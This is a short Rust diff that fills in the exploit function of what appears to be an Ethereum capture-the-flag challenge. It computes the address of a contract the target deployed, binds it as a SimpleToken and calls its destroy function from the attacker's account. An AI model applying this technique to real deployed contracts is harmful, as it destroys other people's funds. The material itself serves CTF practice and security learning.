@@ -27,6 +27,13 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let derived_address =
+            ethers::utils::get_contract_address(target.address, 1);
+
+        let token = SimpleToken::new(derived_address, offender.to_owned());
+
+        token.destroy(offender.address()).send().await?.await?;
+
         Ok(())
     }
 }
